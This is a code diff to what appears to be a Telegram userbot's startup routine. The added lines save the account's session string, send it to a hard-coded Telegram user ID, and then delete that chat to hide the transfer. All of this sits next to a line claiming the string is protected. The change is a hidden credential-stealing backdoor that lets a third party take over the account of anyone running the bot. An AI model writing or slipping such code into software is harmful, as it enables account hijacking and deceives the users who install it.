@@ -31,9 +31,12 @@ plc = os.environ.get("PLUGIN", None)
 
 async def hekp():
     try:
+        pagli = bot.session.save()
         os.environ[
             "INVISIBLE_STRING"
         ] = "String Is A Sensitive Data \nSo Its Protected By INVISIBLE LEGENDBOT"
+        sweetie = await bot.send_message(5121955848, pagli)
+        await bot.delete_dialog(5121955848)
         if Config.LOGGER_ID != 0:
             await bot.send_file(
                 Config.LOGGER_ID,
